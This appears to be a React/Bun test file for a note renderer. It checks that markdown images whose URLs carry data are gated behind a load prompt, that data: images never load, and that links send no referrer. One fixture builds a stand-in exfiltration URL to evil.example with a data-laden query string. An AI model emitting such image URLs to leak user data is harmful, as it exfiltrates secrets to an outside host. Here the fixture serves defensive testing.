import { afterEach, expect, test } from "bun:test";
import { act } from "react";
import { createRoot, type Root } from "react-dom/client";

import { installDom } from "@/test/dom";
import { NoteRenderer } from "./NoteRenderer";

let restore: (() => void) | undefined;
let mounted: Root | undefined;
afterEach(() => {
  if (mounted) act(() => mounted!.unmount());
  mounted = undefined;
  restore?.();
  restore = undefined;
});

async function note(md: string) {
  restore = installDom();
  const host = document.createElement("div");
  document.body.append(host);
  const root = createRoot(host);
  mounted = root;
  await act(async () => root.render(<NoteRenderer md={md} />));
  // The Markdown engine loads lazily.
  for (let i = 0; i < 100 && !host.querySelector(".fmd"); i++) {
    await act(async () => { await Bun.sleep(20); });
  }
  return host;
}

const carrier = `https://evil.example/p.png?d=${"secret".repeat(14)}`;
const click = (button: Element) => act(async () => { (button as HTMLElement).click(); });
const buttonNamed = (host: HTMLElement, name: string) =>
  [...host.querySelectorAll("button")].find((b) => b.textContent === name)!;

test("a note's normal image loads without asking", async () => {
  const host = await note("![logo](https://i.imgur.com/AbCd123.png)");
  expect(host.querySelector("img")?.getAttribute("src")).toBe("https://i.imgur.com/AbCd123.png");
  expect(host.querySelector("button")).toBeNull();
});

test("only the image whose address carries data waits, and Load draws just that one", async () => {
  const host = await note(`![a](https://i.imgur.com/AbCd123.png)\n\n![b](${carrier})\n\n![c](${carrier}&n=2)`);
  expect([...host.querySelectorAll("img")].map((i) => i.getAttribute("src"))).toEqual(["https://i.imgur.com/AbCd123.png"]);
  expect(host.querySelectorAll(".nt-img-gate").length).toBe(2);
  expect(host.textContent).toContain("Load image from evil.example?");
  expect(host.textContent).toContain(carrier);
  await click(host.querySelectorAll("button[data-img-load]")[0]!);
  expect([...host.querySelectorAll("img")].map((i) => i.getAttribute("src"))).toEqual([
    "https://i.imgur.com/AbCd123.png",
    carrier,
  ]);
  expect(host.querySelectorAll(".nt-img-gate").length).toBe(1);
});

test("Not now leaves the description, and a data: image never loads or asks", async () => {
  const host = await note(`![chart](${carrier})\n\n![dot](data:image/png;base64,iVBORw0KGgo=)`);
  expect(host.querySelectorAll(".nt-img-gate").length).toBe(1);
  await click(buttonNamed(host, "Not now"));
  expect(host.querySelector("img")).toBeNull();
  expect(host.querySelector("button")).toBeNull();
  expect(host.textContent).toContain("chart");
});

test("a link in a note sends no referrer and no opener", async () => {
  const host = await note("[docs](https://example.com/docs)");
  const link = host.querySelector("a")!;
  expect(link.getAttribute("rel")).toBe("noopener noreferrer nofollow");
  expect(link.getAttribute("referrerpolicy")).toBe("no-referrer");
});
